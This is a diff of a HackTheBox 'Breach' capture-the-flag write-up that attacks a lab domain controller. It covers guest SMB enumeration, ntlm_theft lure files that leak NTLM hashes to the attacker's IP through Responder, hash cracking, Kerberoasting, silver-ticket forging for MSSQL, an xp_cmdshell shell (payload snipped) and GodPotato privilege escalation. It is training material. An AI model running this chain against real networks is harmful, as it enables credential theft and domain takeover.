@@ -1,5 +1,7 @@
 # [HackTheBox - Breach](https://app.hackthebox.com/machines/Breach)
+
 ![46ad3b94d4e0c8388c661813b8fb8691.png](/resources/46ad3b94d4e0c8388c661813b8fb8691.png)
+
 ## Table of Contents
 
 - [Abstract](#abstract)
@@ -28,6 +30,7 @@ nmap $IP
 ![11fec01c57ae3d06db7c7a02d9276b1c.png](/resources/11fec01c57ae3d06db7c7a02d9276b1c.png)
 
 I rerun nmap scan again but this time with `-sCV` flag for service enumeration and nmap script engine, which I discovered the hostname here and found that my initial nmap scan missed MSSQL port, and beside that we can also see that the port 80 is just hosting basic IIS landing page.
+
 ![9ba38760f500f464525bbc4e5147ab5a.png](/resources/9ba38760f500f464525bbc4e5147ab5a.png)
 
 Since this is the domain controller, I start by enumerating SMB and LDAP next with null session and guest user which I found that null session can not be used here but the guest user is enabled and can use to enum and we can see that we can read and write on `share` folder
@@ -43,12 +46,15 @@ smbclient \\\\breach.vl\\share -N
 ![86a29f1971ef0c0d85967cc80cb0cec3.png](/resources/86a29f1971ef0c0d85967cc80cb0cec3.png)
 
 I found 3 users from `transfer` folder so at least we know that these 3 users are the active user on this machine.
+
 ![828d9d8d2028bbfa3ad8dc8d67e10282.png](/resources/828d9d8d2028bbfa3ad8dc8d67e10282.png)
 
 Nothing really impressed on Users share
+
 ![efaf51a807fc8d8bc7c0cf8bcc399fc7.png](/resources/efaf51a807fc8d8bc7c0cf8bcc399fc7.png)
 
 I use RID cycling method to see if i can pull user list on this domain and sure enough, I can since I can use guest account to access SMB share so RPC can be used for this method.
+
 ![3c21d9374d898d65294470d1cd9df20b.png](/resources/3c21d9374d898d65294470d1cd9df20b.png)
 
 ## Obtaining Julia.Wong credential with ntlm_theft
@@ -60,6 +66,7 @@ python ntlm_theft.py -s 10.10.14.24 -f newpolicy -g all
 ![b609212f9c4546066d986d37c22a8f35.png](/resources/b609212f9c4546066d986d37c22a8f35.png)
 
 Then I upload it to `transfer` folder.
+
 ![962b2e25da423b54cadf3a6237d3e481.png](/resources/962b2e25da423b54cadf3a6237d3e481.png)
 
 As soon as I use `responder` to setup the listener for NTLMSSP, I got NTLMv2 hash of Julia.Wong right away.
@@ -107,6 +114,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
 ![50225f1e29b4d4660128d544be720432.png](/resources/50225f1e29b4d4660128d544be720432.png)
 
 But after turn out, this user still have "guest" access on the MSSQL service so what should I do next?
+
 ![cdae923635bff44a6effc8c5e0379a09.png](/resources/cdae923635bff44a6effc8c5e0379a09.png)
 
 ## Silver Ticket to MSSQL
@@ -128,12 +136,15 @@ bloodhound-python -u 'Julia.Wong' -p 'Computer1' -d breach.vl -c all -ns 10.129.
 ![901f12098260ecb62ae83b8f4b645db9.png](/resources/901f12098260ecb62ae83b8f4b645db9.png)
 
 The service account’s SPN can be retrieved from BloodHound; however, our silver ticket is unusable because the SPN does not match the legitimate value (Already tried). So I will need another method to get the service SPN here. (and that's method is using `impacket-GetUserSPNs` for kerberoasting attack and the SPN that was displayed is the one that can be used to create silver ticket.)
+
 ![1104efef1e75ddbd5de9179789677a1e.png](/resources/1104efef1e75ddbd5de9179789677a1e.png)
 
 Interestingly, there is one more user in the Administrators group which is Christine.bruce here.
+
 ![1ddd64e05c82687120b2059ffa02deaa.png](/resources/1ddd64e05c82687120b2059ffa02deaa.png)
 
 Lastly, I grab the domain SID here and we will have all requirements for the silver ticket forging.
+
 ![2c5c37affd3ee0c052b8adf53e9fc5c0.png](/resources/2c5c37affd3ee0c052b8adf53e9fc5c0.png)
 
 I use impacket-ticketer to create a silver ticket for Administrator account and then use it to authenticate to MSSQL and now I have accessed to MSSQL user as database owner (dbo).
@@ -168,14 +179,17 @@ I simply parse the command like this and now I have shell as "svc_mssql" user on
 xp_cmdshell powershell.exe...<SNIP>
 ```
 ![46c1b630b0d9683ac133c0dfd4b07011.png](/resources/46c1b630b0d9683ac133c0dfd4b07011.png)
+
 ![3a4d07b4a7b121e5acdd46187e63b2de.png](/resources/3a4d07b4a7b121e5acdd46187e63b2de.png)
 
 ## Privilege Escalation via Potato (SeImpersonatePrivilege)
 
 Normally when I have SeImpersonatePrivilege on meterpreter, I can use `getsystem` to get a SYSTEM shell easily but it could not be used on this box since all pipe instance are busy as shown in the image below. 
+
 ![77a535aab32f0493ea4db3442751d9a0.png](/resources/77a535aab32f0493ea4db3442751d9a0.png)
 
 So I will use [GodPotato](https://github.com/BeichenDream/GodPotato) instead which I upload it to music folder of public user.
+
 ![312e02a0207b917ccf992905e054a0c9.png](/resources/312e02a0207b917ccf992905e054a0c9.png)
 
 I test with a simply whoami command first to see if GodPotato can really be used and we can see that it being ran as NT AUTHORITY\SYSTEM so this should not be a problem to get SYSTEM shell now.
@@ -191,11 +205,14 @@ GodPotato-NET4.exe -cmd "powershell.exe...<SNIP>""
 ![e8f1424d867f34a80822110d2f20e8ba.png](/resources/e8f1424d867f34a80822110d2f20e8ba.png)
 
 User flag
+
 ![b5a030b37c82ac7e211d6f9f22101fb7.png](/resources/b5a030b37c82ac7e211d6f9f22101fb7.png)
 
 Root flag
+
 ![3499ce5087a7afe7f136140f0ed37709.png](/resources/3499ce5087a7afe7f136140f0ed37709.png)
 
 ![b9a2f9a205825c67f52d1ea064f305ae.png](/resources/b9a2f9a205825c67f52d1ea064f305ae.png)
+
 https://labs.hackthebox.com/achievement/machine/1438364/766
 ***
